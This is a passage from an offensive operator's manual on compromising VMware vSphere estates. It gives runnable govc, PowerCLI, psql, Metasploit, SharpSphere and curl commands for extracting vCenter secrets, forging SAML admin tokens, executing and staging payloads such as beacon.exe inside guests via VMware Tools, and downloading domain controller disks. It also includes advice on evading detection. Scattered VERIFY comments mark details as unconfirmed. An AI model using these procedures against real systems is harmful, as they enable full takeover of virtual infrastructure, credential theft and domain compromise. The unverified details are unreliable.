The `description` field is disproportionately useful here. Platform service accounts are created by hand, once, years ago, and the description says what they are for. It occasionally says the password.

Once you have a credential, enumerate the permission model from the platform side. This is read-only and tells you exactly who owns the estate.

```bash
govc permissions.ls -i        # role assignments on the root inventory object
govc permissions.ls -i /DC01  # and per inventory object
govc role.ls                  # roles and their privilege sets
govc role.ls Admin            # the privileges in a named role
govc session.ls               # who is logged in right now, from where, and how
```

```powershell
Connect-VIServer -Server $TARGET -User $USER -Password $PASS

Get-VIPermission | Select-Object Principal,Role,Entity,Propagate,IsGroup | Sort-Object Role
Get-VIRole | Select-Object Name,@{n='Privs';e={$_.PrivilegeList.Count}}
Get-VIAccount -Domain vsphere.local
Get-VIAccount -Group -Domain vsphere.local
```

**Verify it worked.** `govc session.ls` returning your own session confirms authentication. `govc permissions.ls -i` returning the `Administrator` role against a group you control confirms the escalation path. If `permissions.ls` returns an empty set or a permission denied, your credential authenticated but holds no propagating role, which is itself information: there is a role assignment further down the inventory tree, so walk it.

**Detection and opsec.** This is where the real risk sits and it deserves specifics.

Every authentication attempt against vCenter, successful or not, produces an SSO event with the source IP, the account, and the result. These land in the vCenter events database and in `/var/log/vmware/sso/` and the SSO audit event log, and they are retained for months. **Do not spray vSphere SSO.** The lockout policy defaults are strict enough that a modest spray will lock `administrator@vsphere.local` out, which is an immediate, obvious, high-visibility failure that the platform team will notice within the hour because it breaks their own logins. <!-- VERIFY exact default lockout thresholds vary by version -->

Failed logins against an ESXi host land in `/var/log/auth.log` and `/var/log/hostd.log`, and repeated failures raise the host's own account lockout and, on many builds, a visible warning in the host summary. ESXi is a more forgiving spray target than vCenter but it is not free.

Where the AD identity source is in play, authentication attempts using domain credentials become **domain** authentication events on the DC as well, subject to the domain lockout policy. Locking out a domain account by spraying vCenter is a real and easily made mistake.

The quiet approach: obtain one credential from somewhere else and use it once. Platform credentials are far more efficiently harvested from management hosts, admin workstations and backup servers than guessed.

**Failure modes.** `Cannot complete login due to an incorrect user name or password` with a credential you know is good usually means you omitted the SSO domain suffix: SSO wants `administrator@vsphere.local`, not `administrator`. A domain credential needs `user@domain.fqdn` or `DOMAIN\user`, and which forms work depends on how the identity source was added. `govc` returning a certificate error is the missing `GOVC_INSECURE=1`. A `503 Service Unavailable` from `/sdk` on vCenter means `vpxd` is down, common on an appliance whose disk filled up, and worth noting because a vCenter with a full disk is a vCenter whose logs stopped.

##### ESXi joined to Active Directory, and CVE-2024-37085

**What it is.** ESXi hosts can be joined to Active Directory for host-level authentication. When joined, a named AD group is granted the full administrator role on the host automatically. The default group name is a fixed string, and the mechanism for resolving it was implemented badly enough to produce an authentication bypass that ransomware crews exploited at scale.

**Why it works.** On a joined host, membership of the configured AD group confers full administrative rights on the host. The group is identified by name rather than by SID, and the host's handling of the case where that group does not currently exist in the directory was flawed: an attacker with sufficient rights in AD could re-create, rename or newly create the configured group and have the host grant its members full access. Microsoft documented three variants observed in the wild: create the group in the domain and add a user to it, rename an existing group to the target name and use its existing members, or force a privilege refresh on the host to pick up the change. The group name is `ESX Admins` in Microsoft's write-up and `ESXi Admins` in the vendor advisory; check both and check the host's actual configured value. <!-- VERIFY exact default group name string differs between sources -->

**Preconditions.** The ESXi host is joined to AD. You have rights in the domain to create a group or rename one, which is a lower bar than it sounds: `Account Operators`, a delegated OU permission, or `CreateChild` on any container is enough. The host is unpatched, fixed in ESXi 8.0 U3 and in backported patches for earlier lines.

**Commands.** Identify joined hosts first, because most hosts are not joined and the technique does not apply to them.

```bash
# From an authenticated vSphere session, the host's AD configuration is readable.
govc host.info -host $TARGET
govc object.collect -s "HostSystem:$MOID" config.adminDisabled  # <!-- VERIFY property path -->
```

```bash
# On the host itself, if you have a shell.
/usr/lib/vmware/likewise/bin/domainjoin-cli query    # <!-- VERIFY path on current builds -->
esxcli system permission list
```

The domain-side action is ordinary group creation, covered in the Coercion, Relay and Certificate Abuse section, which owns Active Directory persistence and dominance. The point to take away is not the syntax but the relationship: **on a joined host, a domain group name is a credential.** Even fully patched, that remains true. If `CORP\ESX Admins` exists and you can add a member to it, you are a host administrator on every joined host, no vulnerability required. That is the more common finding and the more durable one.

**Verify it worked.** Authenticate to the host's API with your domain credential and check that you hold administrative privilege, for example by listing VMs and reading a host configuration property that requires it.

**Detection and opsec.** Group creation and membership changes in AD generate 4727, 4728, 4731 and 4732 events on the domain controller, and a group named `ESX Admins` appearing in the directory is exactly the kind of thing a competent detection rule looks for since this became a headline. The host records the permission grant in `hostd.log`. This is a loud technique with a very high payoff; if you use it, expect it to be found in the log review.

**Failure modes.** The host is not joined to AD, which is the usual case. The configured group name differs from the default, in which case read the host's actual configuration rather than guessing. Privilege refresh has not occurred, so the grant is not yet live. The host is patched, in which case only the legitimate group-membership path works.

#### The categories of vSphere vulnerability

**What it is.** vCenter and ESXi have a long and productive history of exploited vulnerabilities. Rather than a CVE list that ages out, learn the categories, because each category recurs and each has a characteristic exploitation shape and a characteristic yield.

**Why it works.** vCenter is a large Java and C++ application stack shipped as an appliance, with several always-enabled plugins that most customers do not use, an RPC surface that predates modern memory-safety practice, and a service architecture in which most components run as root. ESXi exposes a smaller surface but historically included a network service, OpenSLP, that had no business being reachable.

| Category | Mechanism | Representative CVEs | Typical yield |
| --- | --- | --- | --- |
| Unauthenticated file upload in a vCenter plugin | An always-installed plugin exposes an endpoint that writes attacker-controlled files outside its intended directory | CVE-2021-21972 (vROps plugin, `/ui/vropspluginui/rest/services/uploadova`), CVE-2021-21985 (vSAN Health plugin), CVE-2021-22005 (Analytics service) | Root on the VCSA, or SYSTEM on the legacy Windows install |
| Unauthenticated memory corruption in the vCenter DCERPC implementation | Heap overflow reachable pre-authentication by a crafted packet | CVE-2023-34048, CVE-2024-37079, CVE-2024-37080, CVE-2024-38812 | Code execution in the vCenter service context, usually chained with a local privesc to root <!-- VERIFY CVE-to-advisory mapping --> |
| Local privilege escalation on the VCSA | A misconfigured `sudo` rule or a service running with excess privilege lets a low-privileged local account become root | CVE-2024-37081, CVE-2024-38813 | Root, as the second half of the chain above <!-- VERIFY --> |
| Authentication bypass in the SSO directory | `vmdir` accepted operations it should have rejected, letting an unauthenticated client read and write the SSO directory | CVE-2020-3952 | Add yourself to the SSO `Administrators` group, then log in legitimately |
| Unauthenticated memory corruption in an ESXi network service | OpenSLP heap overflow, reachable on 427 | CVE-2019-5544, CVE-2021-21974 | Root on the ESXi host. This is the pair the ESXiArgs ransomware campaign used |
| ESXi AD integration authentication bypass | Group name resolution flaw on domain-joined hosts | CVE-2024-37085 | Full administrative access to the host with a domain credential |
| Guest to host escape | Memory corruption in device emulation or a paravirtual transport, in the per-VM `vmx` process, usually chained with a second bug to reach the VMkernel | CVE-2024-22252, CVE-2024-22253 (USB controller use-after-free), CVE-2025-22224, CVE-2025-22225, CVE-2025-22226 (VMCI and related, exploited in the wild) | Code execution in the VMX process, then the host <!-- VERIFY component attribution per CVE --> |
| Host to guest authentication bypass in VMware Tools | Tools failed to authenticate host-originated guest operations | CVE-2023-20867 | Guest command execution from a compromised ESXi host with no guest credentials |
| Third-party library in the appliance | The appliance ships a vulnerable dependency | CVE-2021-44228 (Log4Shell, which hit vCenter and Horizon hard) | Whatever the affected component runs as, frequently root |

**Preconditions.** Almost all of these need only network reachability to 443 on the target, which is why the segmentation and management network access material later in this part is the real precondition for the whole discipline. Exploitation is version and build specific, which is why fingerprinting the exact build first is not optional.

**Commands.** Two things worth saying rather than pasting exploit code. First, `nuclei` and the vendor's own advisories will tell you whether a build is affected faster than reading the CVE text, and the Broadcom advisories publish exact fixed build numbers, which is the only reliable comparison. Second, the appliance-side plugin upload bugs all have the same post-exploitation shape: you get a write primitive as root on a Photon OS box, and the reliable conversions are an SSH `authorized_keys` write, a cron drop, or writing a payload into a path the web stack executes.

```bash
nuclei -u https://$TARGET -tags vmware,vcenter,esxi -severity critical,high
```

**Verify it worked.** For a build-level assessment, compare the build number against the advisory's fixed build, not against the version string. For exploitation, the confirmation is a shell as `root` on the VCSA, at which point move straight to the credential extraction below, because that is the actual objective and the shell is only the means.

**Detection and opsec.** The plugin upload bugs leave files on disk and requests in the web access logs at `/var/log/vmware/`, both of which survive and both of which are the first thing an incident responder looks at. The DCERPC bugs crash the target service when they fail, and a `vpxd` crash generates a core dump, an alarm, and a support ticket. ESXi OpenSLP exploitation crashes the SLP daemon on failure and is trivially visible in `/var/log/`. Treat memory-corruption exploitation of a hypervisor as a decision with outage risk attached, not a free move: a failed attempt against ESXi can purple-screen the host, which takes every guest on it down hard.

**Failure modes.** The single most common failure is a build that looks vulnerable by version string and is not, because the patch was delivered in a build within the same version. The second most common is a reverse proxy or load balancer in the path that rewrites or blocks the exploit request. The third is a plugin that has been explicitly disabled, which is a documented workaround for several of the upload bugs and leaves the endpoint returning 404 rather than an upload response.

#### Credential extraction from vCenter

**What it is.** Once you are root on a VCSA, or once you have a copy of its disk or a backup of it, you can extract the credentials and keys for the entire virtual estate. This is the highest-value single action in vSphere post-exploitation and it is what makes vCenter root worth chasing rather than just useful.

**Why it works.** vCenter has to be able to authenticate to every host it manages, without human intervention, forever. That requires it to store recoverable credentials rather than hashes, which in turn requires a local key, which is on the same filesystem. Separately, it has to issue SAML tokens for its own web client, which requires the identity provider signing key, which is in the SSO directory database in the clear. And it has to be able to issue certificates for platform components, which requires a certificate authority private key, which is also on disk. Every one of those is a deliberate design requirement, so none of them is going to be fixed, and the mechanisms have been stable across major versions.

The specific stores:

| Item | Location | What it gives you |
| --- | --- | --- |
| `vpxuser` passwords for every managed host | `password` column of the `VPX_HOST` table in the `VCDB` PostgreSQL database, encrypted with a symmetric key at `/etc/vmware-vpx/ssl/symkey.dat` | Full administrative access to every ESXi host in the estate, independently of vCenter |
| VCDB database credentials | `/etc/vmware-vpx/vcdb.properties` | Read of the whole management database without needing the postgres superuser |
| SSO identity provider signing certificate and key | `/storage/db/vmware-vmdir/data.mdb` | Forge a SAML assertion for any SSO principal, including `administrator@vsphere.local`, with no password |
| SSO account password hashes | The same `data.mdb` LMDB store | Offline cracking of platform accounts, and the SSO machine account credentials |
| VMCA root certificate and private key | `/var/lib/vmware/vmca/root.cer` and `/var/lib/vmware/vmca/privatekey.pem` | Mint certificates trusted by every component in the platform |
| Guest customisation specification secrets | `vpx_customization_spec` table in VCDB | Local administrator passwords and domain-join credentials used when VMs were deployed from templates. These are frequently still valid and frequently privileged |
| Machine account credential for the SSO domain | vCenter's local registry via `lwregshell` | The appliance's own directory identity |

The guest customisation row deserves emphasis because it is the one people skip. A customisation specification is how vSphere sets the local administrator password and joins a VM to the domain when it is deployed from a template. The domain-join credential stored there is an account with the right to join computers to the domain, sometimes considerably more, and the local administrator password is the one every VM deployed from that template still has.

**Preconditions.** Root on the VCSA, or read access to its filesystem by another route: a copy of its VMDK from a datastore, a file-level backup, an appliance backup archive, or a snapshot. The SAML forging path needs only `data.mdb`, which means **a vCenter backup on a file share is equivalent to vCenter administrator**. That is worth stating plainly because backups of the VCSA are routinely written to an SMB share with generous permissions.

**Commands.** The whole extraction is automated, and the automated version is more complete than doing it by hand.

```bash
# From a Meterpreter or shell session as root on the VCSA.
use post/linux/gather/vcenter_secrets_dump
set SESSION 1
run
```

That module dumps the SSO domain account and password, the VCDB credentials, `vpxuser` passwords for every connected host, the SSO user hashes, the VMCA root key and the other platform certificates and keys, the guest customisation secrets, and the service encryption keys. Options `DUMP_VMDIR`, `DUMP_VMAFD` and `DUMP_SPEC` control the three main phases and default to enabled.

Doing the important parts manually, for when you have a shell rather than a Meterpreter session:

```bash
# Database credentials, then the host table.
cat /etc/vmware-vpx/vcdb.properties

/opt/vmware/vpostgres/current/bin/psql -U postgres -d VCDB \
  -c "select id, dns_name, ip_address, user_name, password from vpx_host;"    # <!-- VERIFY psql binary path across versions -->

# The symmetric key that decrypts the password column.
xxd /etc/vmware-vpx/ssl/symkey.dat

# Certificate authority material.
cat /var/lib/vmware/vmca/root.cer
cat /var/lib/vmware/vmca/privatekey.pem

# The SSO directory database, which is what you want off the box.
ls -la /storage/db/vmware-vmdir/data.mdb
```

The `vpxuser` password in `VPX_HOST` is encrypted, not hashed, with the key in `symkey.dat`. Decryption is implemented in the Metasploit module and in several standalone reimplementations; the point of principle is that possession of both files is possession of the plaintext.

The SAML path is the one to reach for when you have the database file but not a shell, which is the common case with a stolen backup:

```bash
# Extract the IdP certificate and key from the SSO directory database and
# use them to sign an assertion for the built-in Administrator, returning a
# session cookie for the vSphere client.
python3 vcenter_saml_login.py -p data.mdb -t $TARGET
```

Success prints a `VSPHERE-UI-JSESSIONID` cookie which you set in a browser or feed to a client. There is also a Metasploit module, `auxiliary/admin/vmware/vcenter_forge_saml_token`, which takes the IdP certificate, the IdP private key and the VMCA certificate along with the SSO domain name and vCenter FQDN, and returns the same thing. Where you do not have the database file but do have root, extract the certificates with the Metasploit post module and feed them to the forging module.

Once you hold `vpxuser` passwords, use them against the hosts directly. This is often better than continuing through vCenter, because host-level API activity is logged on the host rather than in the vCenter events database that the platform team actually reads.

```bash
export GOVC_URL="https://$TARGET/sdk"
export GOVC_USERNAME='vpxuser'
export GOVC_PASSWORD="$PASS"
export GOVC_INSECURE=1
govc about
govc ls /
```

**Verify it worked.** For the SAML path, the returned cookie authenticates to `/ui` as `administrator@vsphere.local`; confirm by requesting an authenticated API endpoint or loading the client. For `vpxuser`, `govc about` against the host succeeds and `govc ls /` enumerates the host's inventory. For the customisation specification secrets, test the recovered local administrator password against a VM deployed from that template.

**Detection and opsec.** Reading files as root on the appliance generates no events in the vCenter events database, which is the log the platform team looks at. It does generate shell history and, if SSH was used, `auth.log` entries on the appliance. Running `psql` against VCDB is not logged by default in a way anyone reviews. **The SAML forging path is notably quiet in one specific way and notably loud in another:** it produces no failed authentication, no password check, and no lockout, but the resulting session appears in `govc session.ls` and in the SSO events as a successful login by `administrator@vsphere.local`, with your source IP. If the platform team has an alert on that account authenticating from anywhere other than the jump host, this trips it. Using `vpxuser` against hosts directly avoids vCenter's event database entirely, at the cost of `hostd.log` entries on each host you touch.

**Failure modes.** `vcdb.properties` unreadable means you are not actually root, or you are on a vCenter with an external database, in which case the connection string in that file points at the real database elsewhere and that is now your target. `psql` not found means the version ships it under a different path; locate it rather than assuming. The SAML tool failing to find certificates in `data.mdb` usually means an LMDB that was copied while in use and is truncated, so take the copy from a snapshot or a proper backup rather than `cp` on a live appliance. Forging failing with a signature error usually means an SSO domain name mismatch: the assertion's issuer must match the deployment's actual SSO domain, which is not always `vsphere.local`. A forged session that authenticates but has no privileges means you targeted a principal that is not in the SSO `Administrators` group.

#### The vpxuser mechanism and what it grants

**What it is.** When vCenter takes management of an ESXi host, it creates a local account on that host called `vpxuser` and grants it the full administrative role. That account is how vCenter does everything it does to the host.

**Why it works.** vCenter cannot rely on a human-supplied credential for ongoing management, so it provisions its own. The password is randomly generated, is long, is never displayed anywhere in the interface, and is stored recoverably in vCenter's database because vCenter needs to present it on every connection. It is rotated automatically on a schedule governed by a vCenter advanced setting, `VirtualCenter.VimPasswordExpirationInDays`, defaulting to 30 days. <!-- VERIFY setting name and default -->

Three consequences follow, and they are the reason this account matters more than it looks.

First, **`vpxuser` holds full administrative privilege on the host, not a scoped subset.** There is no least-privilege version of it. Recovering it gives you everything root gives you through the API: inventory, guest operations, datastore access, snapshot control, host configuration, and the ability to create further local accounts.

Second, **it is a per-host credential recoverable from a single central location.** One successful extraction from vCenter yields one working administrative credential for every host in the estate, in one operation. There is no lateral movement involved and no further authentication to attack.

Third, **it survives the loss of vCenter.** Disconnecting a host from vCenter, or vCenter being rebuilt, does not remove the account. Orphaned `vpxuser` accounts with stale passwords accumulate on hosts that were moved between vCenters, and those stale passwords are in old backups of the old vCenter's database.

**Preconditions.** Read access to the `VPX_HOST` table and to `symkey.dat`, as described above. Network reachability to 443 on the target host.

**Commands.** Covered in the credential extraction from vCenter section above. The thing to add is what to do with it, which is to prefer it over your vCenter session for anything intrusive.

```bash
# Confirm the credential and identify the host's guests.
GOVC_URL="https://$TARGET/sdk" GOVC_USERNAME=vpxuser GOVC_PASSWORD="$PASS" GOVC_INSECURE=1 \
  govc ls /ha-datacenter/vm
```

**Verify it worked.** Successful `govc about` against the host, and the host's inventory listing under `ha-datacenter`, which is the fixed datacenter name a standalone-addressed ESXi host uses regardless of what the vCenter inventory calls it.

**Detection and opsec.** `vpxuser` authenticating to a host is completely normal traffic, because it happens constantly. What is not normal is `vpxuser` authenticating from an address that is not the vCenter appliance's, and that is visible in `hostd.log`. If you can source your connection from the vCenter appliance itself, or from the management subnet, this becomes very difficult to distinguish from legitimate activity. Cross-reference the Lateral Movement section: a SOCKS proxy through the VCSA is the natural way to do this and has the additional benefit of putting your traffic on the management network without you being on it.

**Failure modes.** An authentication failure with a freshly extracted password almost always means the rotation window elapsed between your database read and your use of it, so re-extract. A host that was recently added to a different vCenter has a different `vpxuser` password than the one in the database you read. Lockdown mode does not block `vpxuser` because it is the account lockdown mode is designed to keep working, which is worth knowing: **lockdown mode blocks direct human login while leaving the vCenter service account fully functional.**

#### Guest operations: command execution into every VM without touching the network

**What it is.** The vSphere API exposes a guest operations interface that runs programs, and reads and writes files, inside a powered-on guest, using the VMware Tools agent as the executor. It is command execution and file transfer into every managed VM, and it does not use the guest's network stack at all.

**Why it works.** VMware Tools maintains a control channel to the hypervisor over the virtual machine's backdoor interface, an I/O port pair the guest can talk to and the VMX process services. That channel exists so the hypervisor can request graceful shutdown, quiesce filesystems for snapshots, report IP addresses, and pass configuration into the guest. The `GuestOperationsManager` managed object in the vSphere API exposes the same channel to an API client: `ProcessManager.StartProgram` to execute, `FileManager.InitiateFileTransferToGuest` and `InitiateFileTransferFromGuest` to move files.

The security-relevant property is the transport. Nothing traverses a virtual switch, a physical switch, a firewall, or a network access control policy. From the guest's point of view the process appears with `vmtoolsd` as its parent and no network connection preceding it. This means guest operations reaches VMs on isolated networks, VMs on a DMZ VLAN you have no route to, VMs behind a host firewall that drops everything, and VMs with no network adapter at all. It is the single most useful primitive in vSphere post-exploitation for the same reason it is useful to VMware's own customers.

**Preconditions.** Be precise about these, because most guest operations failures are a missing precondition rather than a bad command.

- The VM is powered on. Guest operations do not work against a powered-off or suspended VM.
- VMware Tools is installed and running in the guest, and has reached a running state. `govc vm.info` reports the Tools status.
- Your vSphere principal holds the guest operations privileges on that VM. In the vSphere privilege model these are under `Virtual machine > Guest operations`: `Guest operation program execution`, `Guest operation modifications`, and `Guest operation queries`. The built-in `Administrator` role has all of them. Many custom roles deliberately do not, so a credential that can browse the whole inventory may still be unable to run anything.
- **You have credentials valid inside the guest.** This is the precondition people forget. The API authenticates you to the hypervisor, and then the hypervisor asks Tools to authenticate you to the guest, separately. The usual mechanism is a username and password pair, so an NT hash is not sufficient for the standard path. The process runs as the guest user you supply, with that user's privileges.
- The guest credential does not have to be local to the guest. On a domain-joined guest, `DOMAIN\user` works if that user can log on locally, which for any account in a local Administrators group via a domain group it usually can.

That last point is where guest operations becomes powerful in combination with the rest of the engagement: **one domain credential that is a local administrator on a fleet, plus vSphere guest operations privilege, is SYSTEM-equivalent code execution on that whole fleet without a single network connection.**

**Commands.** Enumerate first: which VMs are running, which have Tools up, and what they are.

```bash
govc ls /*/vm
govc vm.info -json '*' | jq -r '.virtualMachines[] | [.name, .runtime.powerState, .guest.toolsRunningStatus, .guest.guestFullName, (.guest.ipAddress // "-")] | @tsv'

# Narrower and faster when you know what you are looking for.
govc find / -type m -runtime.powerState poweredOn
```

Execute. `govc guest.run` handles the awkward part for you: `StartProgram` returns a process ID rather than output, so the tool redirects output to a temporary file in the guest and retrieves it.

```bash
export GOVC_GUEST_LOGIN='CORP\svc_admin:Passw0rd!'

govc guest.run -vm 'DC01' -l "$GOVC_GUEST_LOGIN" whoami
govc guest.run -vm 'DC01' -l "$GOVC_GUEST_LOGIN" hostname
govc guest.run -vm 'FILE01' -l "$GOVC_GUEST_LOGIN" ipconfig /all

# Start something and do not wait for it, for a payload.
govc guest.start -vm 'APP01' -l "$GOVC_GUEST_LOGIN" C:\\Windows\\System32\\cmd.exe /c "..."

# Process listing inside the guest.
govc guest.ps -vm 'APP01' -l "$GOVC_GUEST_LOGIN"
```

File transfer both ways, which is how you stage a payload or retrieve a database:

```bash
govc guest.upload   -vm 'APP01' -l "$GOVC_GUEST_LOGIN" -f ./beacon.exe 'C:\Windows\Temp\beacon.exe'
govc guest.download -vm 'APP01' -l "$GOVC_GUEST_LOGIN" 'C:\Windows\Temp\out.txt' ./out.txt
```

PowerCLI wraps the same API and is the natural choice when you are operating from a Windows foothold and want to avoid dropping a new binary:

```powershell
Connect-VIServer -Server $TARGET -User $USER -Password $PASS

Get-VM | Where-Object { $_.PowerState -eq 'PoweredOn' -and $_.ExtensionData.Guest.ToolsRunningStatus -eq 'guestToolsRunning' } |
  Select-Object Name,@{n='OS';e={$_.ExtensionData.Guest.GuestFullName}},@{n='IP';e={$_.ExtensionData.Guest.IpAddress}}

Invoke-VMScript -VM 'DC01' -ScriptType Powershell -ScriptText 'whoami; hostname' `
  -GuestUser 'CORP\svc_admin' -GuestPassword 'Passw0rd!'

Copy-VMGuestFile -Source .\beacon.exe -Destination 'C:\Windows\Temp\' -VM 'APP01' -LocalToGuest `
  -GuestUser 'CORP\svc_admin' -GuestPassword 'Passw0rd!'
```

**SharpSphere** is the option to reach for from a .NET tradecraft position, because it does the same thing from a single assembly you can execute in memory from a C2 beacon rather than requiring PowerCLI or a Go binary on disk. It implements code execution with output retrieval, file upload, file download, and listing VMs with Tools running, over the vSphere Web Services API, and supports pass-through authentication so the guest credential can come from the current token rather than being supplied in cleartext.

```text
SharpSphere.exe list --url https://$TARGET/sdk --username $USER --password $PASS
SharpSphere.exe execute --url https://$TARGET/sdk --username $USER --password $PASS \
  --vm-ip $GUESTIP --guestuser $USER --guestpass $PASS --command "whoami"
```

<!-- VERIFY exact SharpSphere argument names against the current release -->

**Verify it worked.** `govc guest.run whoami` returning the expected principal is the confirmation. If it returns nothing but exits zero, the program ran and produced no output, which for `whoami` means you have the wrong path or a shell builtin issue. `govc guest.ps` returning a process table proves the query privilege and Tools state independently of execution privilege, which makes it the better first test.

**Detection and opsec.** This is where guest operations stops being free, and the specifics matter.

The strongest signal is in the guest, not the hypervisor. A process created through this interface has **`vmtoolsd.exe` as its parent process** on Windows, and on Linux it is spawned by the Tools daemon. "`vmtoolsd.exe` spawning `cmd.exe` or `powershell.exe`" is a high-fidelity, low-false-positive EDR rule, it is a well-known rule, and a mature EDR deployment will have it. Assume any modern EDR sees this. It generates an ordinary 4688 process creation event with that parent, and a 4624 logon event for the guest credential you supplied, type 3 or 5 depending on version, so the guest authentication is also logged. <!-- VERIFY logon type reported for guest operations authentication -->

On the hypervisor side, guest operations generate task and event records in vCenter attributed to your vSphere principal and source IP, and entries in the guest's `vmware.log` in its datastore folder and in the Tools logs inside the guest.

The genuinely quiet part is the network: there is no lateral movement artefact, no 445, no WinRM, no new listening port, nothing for a network sensor to see, and nothing for network segmentation to stop. So the trade is real but specific: **you defeat all network-layer detection and controls, and you pay for it with a very recognisable host-layer artefact.** Choose accordingly. If the target has no EDR, this is close to ideal. If it does, use guest operations to do something short and quiet, such as writing a file or reading one, rather than launching an interactive payload under `vmtoolsd`.

Quieter alternatives, in order of preference: read the guest's disk offline instead of executing in it at all, which is the recurring theme of this section; use file transfer without execution, since `InitiateFileTransferFromGuest` reading a file is much less alarming than a process spawn; or use guest operations only to establish a foothold that immediately migrates to a different parent process.

**Failure modes.**

- `InvalidGuestLogin` or an authentication failure: the guest credential is wrong, or the account cannot log on locally in the guest, or you passed a hash where a password is required.
- `GuestOperationsUnavailable`: Tools is not running, or is running but has not completed initialisation, or the VM was only just powered on. Check `toolsRunningStatus`.
- `NoPermission` naming a guest operations privilege: your vSphere role lacks it. Note which one, because the query privilege is often granted where execution is not.
- `Tools not installed`: common on appliances, on Linux VMs where `open-vm-tools` was never installed, and on anything the platform team inherited. Guest operations simply do not exist for those VMs.
- Execution succeeds but you get no output: you used `guest.start` rather than `guest.run`, or the program writes to a location the guest user cannot read back.
- The program runs but with unexpected privileges: `StartProgram` does not elevate. On Windows, a process started this way for an administrator account runs with a filtered token in the same way any non-elevated logon does, so a command needing elevation fails with access denied even though the account is an administrator. <!-- VERIFY UAC behaviour for guest operations on current Tools versions -->
- The guest has no network adapter and you assumed it did: this is a feature, not a failure, and it is exactly the case where guest operations is the only option you have.

#### Datastore access: browsing and downloading a VMDK

**What it is.** vSphere exposes datastore contents over HTTPS. Given a credential with datastore browse privilege you can list every file on every datastore and download any of them, including the virtual disks of running virtual machines.

**Why it works.** A datastore is a filesystem and the API needs a way to move files into and out of it, for template deployment, ISO upload, log collection and file-based operations. That mechanism is an HTTP endpoint at `/folder` on both ESXi and vCenter, taking a datacenter path and a datastore name as query parameters, authenticating with ordinary HTTP Basic or with a session cookie. It is a file server, and the files it serves happen to be the disks of every machine in the estate.

The permission model is coarse. The relevant privilege is `Datastore > Browse datastore` plus `Datastore > Low level file operations`, and it is granted per datastore rather than per virtual machine. A role that can browse a datastore can read every VM on it, regardless of whether the principal has any privilege at all on those VMs. This is a common and consequential misconfiguration: a backup or reporting role granted datastore browse across the estate is a role that can read the domain controller's disk.

**Preconditions.** A credential with datastore browse and low-level file operation privileges, or root or `vpxuser` on a host. Network reachability to 443. Enough local disk to receive the download, and enough patience or bandwidth, because a domain controller disk is tens of gigabytes.

**Commands.** The raw HTTP interface first, because it works with nothing but `curl` and it is what everything else wraps.

```bash
# List datastores available through a host. dcPath is ha-datacenter on a
# standalone-addressed ESXi host, and the inventory datacenter name on vCenter.
curl -sk -u "$USER:$PASS" "https://$TARGET/folder?dcPath=ha-datacenter"

# List a datastore root, then walk into a VM's folder.
curl -sk -u "$USER:$PASS" "https://$TARGET/folder?dcPath=ha-datacenter&dsName=datastore1"
curl -sk -u "$USER:$PASS" "https://$TARGET/folder/DC01?dcPath=ha-datacenter&dsName=datastore1"

# Download the disk. Note the -flat suffix.
curl -sk -u "$USER:$PASS" -o DC01-flat.vmdk \
  "https://$TARGET/folder/DC01/DC01-flat.vmdk?dcPath=ha-datacenter&dsName=datastore1"
```

**Common mistake.** Downloading `DC01.vmdk` gives you a one-kilobyte text file and a confusing afternoon. On VMFS a virtual disk is two objects: a small plain-text **descriptor**, named `DC01.vmdk`, and the **extent** holding the actual data, named `DC01-flat.vmdk` for a thick or lazy-zeroed disk. Read the descriptor first, because it names its extents and tells you exactly what to fetch. A disk with snapshots has a chain: the base extent plus one `DC01-00000N-delta.vmdk` per snapshot, and you need the whole chain plus the descriptors to reconstruct a consistent image. A thin disk on some configurations uses `-sNNN.vmdk` sparse extents instead. Always fetch the descriptor, parse it, then fetch what it points to.

```bash
# Read the descriptor to learn the extent layout before downloading gigabytes.
curl -sk -u "$USER:$PASS" \
  "https://$TARGET/folder/DC01/DC01.vmdk?dcPath=ha-datacenter&dsName=datastore1"
```

`govc` is better for enumeration because it recurses and gives you sizes, which is how you find the interesting disks without downloading anything.

```bash
govc datastore.ls -l                          # datastore root, long listing
govc datastore.ls -ds=datastore1 -l -R        # recursive, the whole datastore
govc datastore.ls -ds=datastore1 -l -R -p     # include full paths

# Find every disk in the estate and its size, which is your target list.
govc datastore.ls -ds=datastore1 -l -R | grep -i '\.vmdk$'

govc datastore.download -ds=datastore1 'DC01/DC01-flat.vmdk' ./DC01-flat.vmdk
govc datastore.download -ds=datastore1 'DC01/DC01.vmx' ./DC01.vmx
```

The `.vmx` file is worth grabbing separately and is tiny. It is the VM's configuration: disk layout, network attachments, the guest OS type, UUIDs, and any `guestinfo.*` variables set at deployment time, which on appliances frequently include the root password supplied by the OVF environment.

```powershell
# PowerCLI exposes datastores as a PSDrive, which is the most ergonomic way to browse.
Connect-VIServer -Server $TARGET -User $USER -Password $PASS
New-PSDrive -Name ds -PSProvider VimDatastore -Root '\' -Location (Get-Datastore 'datastore1')
Get-ChildItem ds:\ -Recurse -Filter *.vmdk | Select-Object Name,Length,FolderPath

Copy-DatastoreItem -Item 'ds:\DC01\DC01-flat.vmdk' -Destination .\DC01-flat.vmdk
```

**Reading a running VM's disk, correctly.** A powered-on VM has its base extent open and being written to. You can still read it over `/folder`, and what you get is a smeared, inconsistent image: filesystem metadata from one moment and file contents from another. For a Windows VM that usually still yields the registry hives and often yields `ntds.dit`, but it can also yield a database that will not open.

The correct approach, and the reason snapshots matter, is that **taking a snapshot makes the base extent read-only.** All subsequent writes go to a new delta extent. The base extent you then download is a genuinely consistent point-in-time image of the disk as of the snapshot, with no locking and no smear. This is not a side effect, it is how snapshots work, and it is the single most useful piece of mechanism in this whole section.

**Verify it worked.** Check the size against what the descriptor said. Then verify the image is readable before you rely on it:

```bash
# Identify the partition layout, which proves you have a real disk image.
fdisk -l DC01-flat.vmdk
# Or with libguestfs, which handles the vmdk container and the partitions.
virt-filesystems -a DC01-flat.vmdk --long -h --all
```

**Detection and opsec.** Datastore reads over `/folder` appear in the host's or vCenter's web access log with the requesting user, the source IP and the full path, so the record of you downloading `DC01-flat.vmdk` is explicit and durable. There is no way to make that read look like something else.

The operational risk is different from the detection risk and is more likely to hurt you. A sustained multi-gigabyte read pulls IOPS from the datastore that every other VM on it is also using, and saturates the host's management uplink, which on many designs is a 1GbE interface shared with vMotion and management traffic. The observable effect is storage latency alarms and slow VMs, which generates a ticket even if nobody looks at the web log. Rate-limit the transfer, do it out of hours, and prefer smaller targets: you rarely need the whole disk.

